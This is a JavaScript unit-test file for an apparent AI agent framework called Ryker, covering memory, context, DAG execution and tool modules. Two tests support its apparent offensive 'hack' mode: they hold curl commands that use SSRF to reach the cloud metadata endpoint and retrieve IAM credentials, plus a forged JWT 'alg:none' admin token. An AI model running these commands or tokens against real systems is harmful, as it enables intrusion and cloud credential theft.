const assert = require("assert");
const { callLLMStream } = require("../../core/llm-providers");
const { estimateTokens, trackUsage, getContextStats, manageContextWindow } = require("../../core/context-manager");
const { MemoryManager } = require("../../core/memory-manager");
const { SelfReflectionEngine, ConfidenceTracker } = require("../../core/quality-gate");
const { CognitiveDecomposer, DAGExecutor, SwarmOrchestrator } = require("../../core/elite-nexus");
const { getTool, resolveToolName } = require("../../core/tool-registry");

console.log("Starting Ryker v2.0.0 Evolution Unit Tests...");

async function testLLMStream() {
  console.log("  Testing callLLMStream with mock provider...");
  let streamed = "";
  const result = await callLLMStream(
    [{ role: "user", content: "Hello Ryker" }],
    { provider: "mock" },
    (chunk) => { streamed += chunk; }
  );
  assert.ok(result.content.length > 0, "Mock stream returned content");
  assert.strictEqual(streamed.trim(), result.content.trim(), "Streamed chunks match total content");
  console.log("  ✔ callLLMStream passed");
}

function testContextManager() {
  console.log("  Testing context manager...");
  const text = "Hello world from Ryker context manager";
  const tokens = estimateTokens(text);
  assert.ok(tokens > 0, "Token estimation returned > 0");

  trackUsage("sess-1", 500, 1000, "openai");
  const stats = getContextStats("sess-1");
  assert.strictEqual(stats.percent, 50, "Usage percent is 50%");
  assert.strictEqual(stats.provider, "openai");

  const msgs = [
    { role: "system", content: "You are an assistant" },
    { role: "user", content: "Turn 1" },
    { role: "assistant", content: "Resp 1" },
    { role: "user", content: "Turn 2" },
    { role: "assistant", content: "Resp 2" }
  ];
  const managed = manageContextWindow(msgs, { maxTokens: 100, reserveTokens: 10 });
  assert.ok(managed.messages.length > 0, "Context window managed messages");
  console.log("  ✔ context manager passed");
}

function testMemoryManager() {
  console.log("  Testing 4-tier memory manager...");
  const mem = new MemoryManager(process.cwd());
  
  // Working memory
  mem.setWorking("test_key", "test_val", 5000);
  assert.strictEqual(mem.getWorking("test_key"), "test_val", "Working memory read/write");

  // Semantic memory
  mem.addSemanticFact("architecture", "Ryker uses DAG-based execution pipelines");
  const facts = mem.getSemanticFacts("DAG");
  assert.ok(facts.length > 0, "Semantic memory retrieved fact");

  // Procedural memory
  mem.addProcedure("Deploy Service", "deploy to production", ["Build code", "Run tests", "Deploy"]);
  const proc = mem.findProcedure("deploy to production");
  assert.ok(proc !== null, "Procedural memory found procedure");

  console.log("  ✔ 4-tier memory manager passed");
}

function testSelfReflection() {
  console.log("  Testing SelfReflectionEngine & ConfidenceTracker...");
  const res = SelfReflectionEngine.reflect("Here is the solution to your issue:\n```js\nconst x = 1;\n```", "solution issue");
  assert.ok(res.aggregateScore >= 0.7, "Reflection score above threshold for clean output");

  const badRes = SelfReflectionEngine.reflect("I'd be happy to help! eval('alert(1)')", "task");
  assert.ok(badRes.needsRevision, "Reflection flagged eval / filler violation");

  const tracker = new ConfidenceTracker(0.9);
  tracker.track(0.85);
  tracker.track(0.95);
  assert.strictEqual(tracker.getRiskLevel(), "LOW");

  console.log("  ✔ SelfReflectionEngine & ConfidenceTracker passed");
}

async function testDAGExecution() {
  console.log("  Testing CognitiveDecomposer & DAGExecutor...");
  const decomposer = new CognitiveDecomposer();
  const dag = decomposer.decompose("Implement authentication API and frontend login view with unit tests");
  assert.ok(dag.tasks.length >= 3, "Decomposed into multiple DAG tasks");

  const executor = new DAGExecutor();
  const events = [];
  const execResult = await executor.execute(dag, async (task) => {
    return { executed: task.taskId, status: "OK" };
  }, (evt) => {
    events.push(evt.type);
  });

  assert.ok(execResult.success, "DAG execution completed successfully");
  assert.ok(events.includes("node:start"), "Emitted node:start event");
  assert.ok(events.includes("node:done"), "Emitted node:done event");
  assert.ok(events.includes("dag:complete"), "Emitted dag:complete event");

  console.log("  ✔ CognitiveDecomposer & DAGExecutor passed");
}

async function testNewBuiltinTools() {
  console.log("  Testing new built-in tools (code.execute, git.status)...");
  const codeTool = getTool("code.execute");
  assert.ok(typeof codeTool === "function", "code.execute tool is registered");
  const codeRes = await codeTool({ code: "const a = 10; const b = 20; a + b;" });
  assert.strictEqual(codeRes.result, 30, "code.execute evaluated correctly");

  const gitTool = getTool("git.status");
  assert.ok(typeof gitTool === "function", "git.status tool is registered");
  const gitRes = await gitTool({ cwd: process.cwd() });
  assert.ok(gitRes.branch !== undefined || gitRes.error !== undefined, "git.status executed");

  console.log("  ✔ New built-in tools passed");
}

async function testHackSessionMemory() {
  console.log("  Testing HackSessionMemory...");
  const { HackSessionMemory } = require("../../core/memory-manager");
  const mem = new HackSessionMemory("test-target");

  // Add SSRF finding that chains to IMDS_CRED_THEFT
  mem.addFinding({
    id: "f1",
    type: "SSRF",
    severity: "HIGH",
    target: "/api/fetch",
    proof: "curl 'https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/'",
    chainPotential: ["IMDS_CRED_THEFT"],
  });

  // Add IMDS_CRED_THEFT — should auto-link to f1
  mem.addFinding({
    id: "f2",
    type: "IMDS_CRED_THEFT",
    severity: "CRITICAL",
    target: "AWS IMDS",
    proof: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ → IAM keys returned",
    chainPotential: [],
  });

  // Chain should be discovered automatically
  const chain = mem.getBestChain();
  assert.ok(chain.length >= 2, `Chain discovered: SSRF -> IMDS_CRED_THEFT (got ${chain.length} findings)`);
  assert.ok(chain.some(f => f.id === "f1"), "Chain includes SSRF finding");
  assert.ok(chain.some(f => f.id === "f2"), "Chain includes IMDS_CRED_THEFT finding");

  const ctx = mem.getAttackContext();
  assert.strictEqual(ctx.confirmedVulns.length, 2, "Both findings stored correctly");
  assert.ok(ctx.topChainScore >= 9.0, `Chain score is CRITICAL (${ctx.topChainScore})`);

  // Test credential storage with hashing
  mem.addCreds({ type: "AWS_IAM_KEY", target: "IMDS", value: "AKIAIOSFODNN7EXAMPLE" });
  assert.strictEqual(mem.credentials.length, 1, "Credential stored");
  assert.ok(mem.credentials[0].hint.endsWith("***"), "Credential masked with hint only");
  assert.ok(!mem.credentials[0].valueHash.includes("AKIAIOSFODNN7EXAMPLE"), "Raw credential not stored");

  // Test failed vector tracking
  mem.addFailedVector("sqli-login-form", "WAF blocking all SQLi payloads");
  assert.strictEqual(mem.failedVectors.length, 1, "Failed vector tracked");

  // Test DAG event emission
  const dagEvent = mem.toDAGEvent();
  assert.strictEqual(dagEvent.type, "dag:update", "DAG event type is correct");
  assert.ok(Array.isArray(dagEvent.tasks), "DAG tasks array present");
  assert.ok(dagEvent.tasks.some(t => t.taskId === "f1"), "DAG contains SSRF finding");

  console.log("  ✔ HackSessionMemory and chain detection passed");
}

async function testHackToolPayload() {
  console.log("  Testing hack payload generation via code.execute...");
  const codeTool = getTool("code.execute");
  assert.ok(typeof codeTool === "function", "code.execute tool available");

  // Verify JWT none-alg payload construction logic
  const result = await codeTool({
    code: `
      const header = Buffer.from(JSON.stringify({alg:"none",typ:"JWT"})).toString("base64url");
      const payload = Buffer.from(JSON.stringify({sub:"admin",role:"administrator",exp:9999999999})).toString("base64url");
      const token = header + "." + payload + ".";
      // Validate: 3 parts, last part empty (no signature)
      const parts = token.split(".");
      const isValidFormat = parts.length === 3 && parts[2] === "";
      const decoded = JSON.parse(Buffer.from(parts[1], "base64url").toString());
      (isValidFormat && decoded.sub === "admin" && decoded.role === "administrator") ? "VALID_JWT_FORMAT" : "INVALID";
    `
  });
  assert.strictEqual(result.result, "VALID_JWT_FORMAT", "JWT none-alg payload constructs correctly");

  // Verify chain score formula
  const scoreResult = await codeTool({
    code: `
      function calculateChainScore(findings) {
        const multipliers = { 1: 1.0, 2: 1.5, 3: 2.0 };
        const multiplier = multipliers[findings.length] || 2.5;
        const cvssMap = { CRITICAL: 9.5, HIGH: 7.5, MEDIUM: 5.0, LOW: 2.5, INFO: 0.5 };
        const sum = findings.reduce((acc, f) => acc + (cvssMap[f.severity] || 0), 0);
        return Math.min(10.0, parseFloat((sum * multiplier).toFixed(1)));
      }
      const chain = [
        { severity: "HIGH" },   // SSRF = 7.5
        { severity: "CRITICAL" } // IMDS = 9.5
      ];
      calculateChainScore(chain); // (7.5 + 9.5) * 1.5 = 25.5 → capped at 10.0
    `
  });
  assert.strictEqual(scoreResult.result, 10.0, "Chain score correctly capped at 10.0 for SSRF+IMDS chain");

  console.log("  ✔ Hack payload generation via code.execute passed");
}

async function runAll() {
  try {
    await testLLMStream();
    testContextManager();
    testMemoryManager();
    testSelfReflection();
    await testDAGExecution();
    await testNewBuiltinTools();
    await testHackSessionMemory();
    await testHackToolPayload();
    console.log("\n All 8 Ryker v2.0.0 evolution test suites PASSED!\n");
  } catch (err) {
    console.error("\n❌ Test failure:", err);
    process.exit(1);
  }
}

runAll();

